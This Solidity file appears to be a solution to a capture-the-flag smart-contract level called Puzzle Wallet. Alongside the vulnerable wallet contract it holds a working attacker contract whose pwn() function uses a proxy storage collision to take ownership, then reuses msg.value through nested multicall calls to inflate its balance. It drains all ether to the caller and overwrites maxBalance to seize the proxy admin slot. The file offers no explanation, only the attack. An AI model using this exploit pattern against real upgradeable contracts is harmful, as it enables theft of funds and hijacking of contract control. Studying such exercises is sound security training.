// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;
interface IPuzzleProxy {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function _implementation() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract PuzzleWalletHacker {
    address private wallet;
    constructor(address _wallet) {
        wallet = _wallet;
    }

    function pwn() external payable {
        require(msg.value >= wallet.balance, "Not enough ether");
        IPuzzleProxy(wallet).proposeNewAdmin(address(this));
        PuzzleWallet(wallet).addToWhitelist(address(this));
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory data = new bytes[](2);
        data[0] = depositCall[0];
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositCall);
        PuzzleWallet(wallet).multicall{value: wallet.balance}(data);
        PuzzleWallet(wallet).execute(msg.sender, wallet.balance, "");//withdraw all ether
        PuzzleWallet(wallet).setMaxBalance(uint256(uint160(msg.sender)));
        require(msg.sender == IPuzzleProxy(wallet).admin(), "Pwn faield");
    }
}